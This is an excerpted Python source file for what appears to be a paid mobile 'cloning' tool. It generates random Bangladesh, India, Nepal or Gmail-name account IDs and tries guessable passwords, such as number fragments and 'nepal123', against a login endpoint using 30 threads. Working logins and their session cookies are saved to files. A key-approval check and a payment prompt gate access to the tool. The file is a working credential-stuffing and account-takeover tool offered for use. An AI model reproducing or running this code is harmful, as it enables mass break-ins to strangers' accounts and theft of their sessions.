...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/manas-2063/approval/blob/main/approval.txt').text
    if id in httpCaht:
      ...
      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} MANAS=['+id+']=XD')
      linex()
      print(f"{R}❲{G}1{R}❳{G} This Is Paid Tool ")
      linex()
      print(f"{R}❲{G}1{R}❳{G} NAMASTE 🙏 7Day=150 PAISA, 15Day=250 PAISA, 30Day=400 PAISA")
      linex()
      input(f'{R}❲{G}1{R}❳{G} Click Enter To Sent Key Admin WhatsApp ')
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('am start https://m.me/manas2080='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
...
def Main_MANAS():
        ...
        if opt1 == "1": file()   
            ...
            clear();print(f'{R}❲{G}1{R}❳{G} Start Bd Uid Cloning');print(f'{R}❲{G}2{R}❳{G} Start India Uid Cloning');print(f'{R}❲{G}3{R}❳{G} Start Nepal Uid Cloning');print(f'{R}❲{G}4{R}❳{G} Start Gmail Cloning');linex()
...
def file():
    clear();print(f"{R}❲{G}~{R}❳{G} Example {R}:{R} /{G}sdcard{R}/{G}MANAS.txt {R}❲{G}ETC{R}❳{G}");linex()
    ...
    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/MANAS_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
...
def bd():
                ...
                print(f'\r{R}--------------------------------------------------')
                input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
                os.system('python Main_MANAS.py')
...
def npl():
                user=[]
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} +9779844 {R}|{G} +9779842 {R}|{G} +9779820 {R}|{G} +9779845');linex()
                code = input(f"{R}❲{G}?{R}❳{G} Selection {R}:{G} ")
                try:                    
                        clear();print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} 3000 {R}|{G} 5000 {R}|{G} 10000 {R}|{G} 9999');linex()
                        limit = int(input(f'{R}❲{G}?{R}❳{G} Selection {R}:{G} '))
                ...
                with tred(max_workers=30) as MRM:     
                        clear()
                        tl = str(len(user))
                        print(f'            {R}❲{G} Nepal Random Uid Cloning{R}❳{G}');linex()
                        print(f'{R}❲{G}~{R}❳{G} Total Id {R}:{A}',tl)
                        print(f'{R}❲{G}~{R}❳{G} Sim Code {R}:{A}',code)
                        print(f'{R}❲{G}~{R}❳{G} If No Result {R}❲{A}On{R}/{A}Off{R}❳{G} Airplane Mode ');linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx[2:],psx,code+psx,code+psx[:3],'nepal123']
                                MRM.submit(rd1,ids,passlist)
                print(f'\r{R}--------------------------------------------------')
                print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
...
def gmail():
                ...
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} Chadni {R}|{G} Nurnobi {R}|{G} Sompa {R}|{G} MANAS');linex()
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}❲{G}MANAS-XD{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        status= lock(uid)
                        if "Active" in status:
                        	print(f'\r{R}❲{G}MANAS-XD_OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                        	Emon(uid,pas)
                        print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'MANAS-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'MANAS-RANDOM-COOKIE.txt')
                        ...
                        file_path = os.path.join(folder_path, 'MANAS-RANDOM-CP.txt')
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G} IMANAS-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    Emon(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'MANAS-FILE-M1-OK.txt')
                    open('/sdcard/XD/MANAS-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' | '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}MANAS-M2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}MANAS-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                    Emon(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'MANAS-FILE-M2-OK.txt')
                    open('/sdcard/XD/MANAS-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' | '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}MANAS-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'MANAS-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
